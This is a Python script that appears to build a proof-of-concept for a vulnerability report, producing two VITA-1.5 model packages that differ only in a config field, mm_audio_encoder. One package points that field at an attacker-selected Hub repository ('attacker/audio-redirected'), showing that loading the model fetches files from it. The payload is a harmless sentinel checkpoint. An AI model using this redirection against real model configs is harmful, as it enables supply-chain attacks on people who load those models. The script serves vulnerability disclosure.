"""Build the two model-package arms (positive / negative) and the second-
repository data files.

- positive: config.json with mm_audio_encoder = "attacker/audio-redirected"
- negative: config.json with mm_audio_encoder = "/opt/artifact/audio-approved"

The two arms are identical except for that single config.json field: the field
is an ordinary, non-executable config value, there is no program sidecar in
either package. Every arm carries the standard Qwen2-style tokenizer members
and an empty model state dict (model.safetensors contains zero tensors, so all
weights are randomly initialised at construction time), which is enough for
from_pretrained to construct the model.

The second repository holds only data files (train.yaml, global_cmvn,
final.pt) - no .py, no plugins. train.yaml and global_cmvn are the legitimate
files from VITA-MLLM/VITA-1.5_AudioEnc (the audio encoder repository that
VITA-1.5's own config.json points at); final.pt is a small benign sentinel
checkpoint, because the defect under test is the *fetch* of these files from
the attacker-selected repository, which happens before torch.load.
"""
import hashlib
import json
import os
import shutil

import torch
from safetensors.torch import save_file

BASE = "/work/poc"
INPUTS = os.path.join(BASE, "inputs")
MODELS = os.path.join(BASE, "models")
POSITIVE = os.path.join(MODELS, "positive")
NEGATIVE = os.path.join(MODELS, "negative")
ATTACKER_REPO_DIR = os.path.join(BASE, "attacker_repo")
APPROVED_DIR = "/opt/artifact/audio-approved"
VISION_DIR = os.path.join(BASE, "vision_siglip_local")
ATTACKER_REPO_ID = "attacker/audio-redirected"

TOKENIZER_FILES = (
    "tokenizer.json",
    "tokenizer_config.json",
    "special_tokens_map.json",
    "vocab.json",
    "merges.txt",
    "added_tokens.json",
)


def build_config(mm_audio_encoder):
    # Field set of the real VITA-1.5 config.json (VITA-MLLM/VITA-1.5 on the
    # Hub); transformer dimensions are shrunk so the model can be constructed
    # on a CPU box. The construction path - and the vulnerability - depends on
    # the config fields, not on the dimension values. mm_vision_tower points
    # at a small local SigLIP directory (identical in both arms) so that the
    # only member that can reach the network is mm_audio_encoder.
    return {
        "_name_or_path": "VITA-MLLM/VITA-1.5",
        "architectures": ["VITAQwen2ForCausalLM"],
        "attention_dropout": 0.0,
        "audio_prompt_finetune": False,
        "audio_prompt_num": None,
        "audio_state_predictor_tuning": False,
        "bos_token_id": 151643,
        "eos_token_id": 151645,
        "freeze_audio_encoder": True,
        "freeze_audio_encoder_adapter": False,
        "freeze_mm_mlp_adapter": False,
        "hidden_act": "silu",
        "hidden_size": 32,
        "image_aspect_ratio": "square",
        "initializer_range": 0.02,
        "intermediate_size": 64,
        "max_position_embeddings": 32768,
        "max_window_layers": 28,
        "mm_audio_encoder": mm_audio_encoder,
        "mm_hidden_size": 32,
        "mm_projector_lr": None,
        "mm_projector_type": "mlp2x_gelu",
        "mm_vision_tower": VISION_DIR,
        "model_type": "vita-Qwen2",
        "num_attention_heads": 4,
        "num_hidden_layers": 2,
        "num_key_value_heads": 2,
        "rms_norm_eps": 1e-06,
        "rope_theta": 1000000.0,
        "sliding_window": None,
        "tie_word_embeddings": False,
        "tokenizer_model_max_length": 6200,
        "tokenizer_padding_side": "right",
        "torch_dtype": "float16",
        "transformers_version": "4.44.2",
        "tune_audio_mlp_adapter": False,
        "tune_mm_mlp_adapter": False,
        "unfreeze_vision_tower": False,
        "use_cache": False,
        "use_mm_proj": True,
        "use_s2": False,
        "use_sliding_window": False,
        "vocab_size": 152064,
    }


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def reset_dir(path):
    shutil.rmtree(path, ignore_errors=True)
    os.makedirs(path, exist_ok=True)


def main():
    # ---- benign local vision tower (identical in both arms) ----
    from transformers import SiglipImageProcessor, SiglipVisionConfig, SiglipVisionModel

    reset_dir(VISION_DIR)
    vision_config = SiglipVisionConfig(
        hidden_size=32,
        intermediate_size=64,
        num_hidden_layers=2,
        num_attention_heads=4,
        image_size=32,
        patch_size=16,
    )
    SiglipVisionModel(vision_config).save_pretrained(VISION_DIR)
    SiglipImageProcessor().save_pretrained(VISION_DIR)
    print(f"[make_poc] benign local vision tower written to {VISION_DIR}")

    # ---- second-repository data files (attacker side) ----
    reset_dir(ATTACKER_REPO_DIR)
    for name in ("train.yaml", "global_cmvn"):
        shutil.copy(os.path.join(INPUTS, name), os.path.join(ATTACKER_REPO_DIR, name))
    torch.save(
        {"__poc_sentinel__": torch.zeros(1)},
        os.path.join(ATTACKER_REPO_DIR, "final.pt"),
    )
    print(f"[make_poc] second-repo data files written to {ATTACKER_REPO_DIR}:")
    for name in sorted(os.listdir(ATTACKER_REPO_DIR)):
        print(f"[make_poc]   {name}")

    # ---- 'approved' local audio-encoder directory used by the negative arm ----
    reset_dir(APPROVED_DIR)
    for name in ("train.yaml", "global_cmvn", "final.pt"):
        shutil.copy(
            os.path.join(ATTACKER_REPO_DIR, name), os.path.join(APPROVED_DIR, name)
        )
    print(f"[make_poc] approved local audio-encoder dir written to {APPROVED_DIR}")

    # ---- the two model-package arms ----
    def write_arm(model_dir, mm_audio_encoder):
        reset_dir(model_dir)
        with open(os.path.join(model_dir, "config.json"), "w", encoding="utf-8") as f:
            json.dump(build_config(mm_audio_encoder), f, indent=2)
            f.write("\n")
        for name in TOKENIZER_FILES:
            shutil.copy(
                os.path.join(INPUTS, "tokenizer", name), os.path.join(model_dir, name)
            )
        # empty state dict, but tagged with the format metadata that
        # transformers' low_cpu_mem_usage loader expects
        save_file({}, os.path.join(model_dir, "model.safetensors"), metadata={"format": "pt"})

    write_arm(POSITIVE, ATTACKER_REPO_ID)
    write_arm(NEGATIVE, APPROVED_DIR)
    print(f"[make_poc] model packages written to {MODELS}/positive and {MODELS}/negative")

    # ---- prove the two arms differ in exactly one config field ----
    with open(os.path.join(POSITIVE, "config.json"), encoding="utf-8") as f:
        pos = json.load(f)
    with open(os.path.join(NEGATIVE, "config.json"), encoding="utf-8") as f:
        neg = json.load(f)
    delta = {k for k in set(pos) | set(neg) if pos.get(k) != neg.get(k)}
    assert delta == {"mm_audio_encoder"}, f"unexpected config delta: {delta}"
    print("[make_poc] config delta between arms: exactly one field -> mm_audio_encoder")
    print(f"[make_poc]   positive mm_audio_encoder = {pos['mm_audio_encoder']}")
    print(f"[make_poc]   negative mm_audio_encoder = {neg['mm_audio_encoder']}")

    # ---- hashes ----
    sums = []
    for root in (POSITIVE, NEGATIVE, ATTACKER_REPO_DIR, APPROVED_DIR, VISION_DIR):
        for dirpath, _, files in os.walk(root):
            for name in sorted(files):
                p = os.path.join(dirpath, name)
                sums.append(f"{sha256(p)}  {p}")
    with open(os.path.join(BASE, "SHA256SUMS.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(sums) + "\n")
    print(f"[make_poc] wrote {len(sums)} hashes to SHA256SUMS.txt")
    print("[make_poc] DONE")


if __name__ == "__main__":
    main()
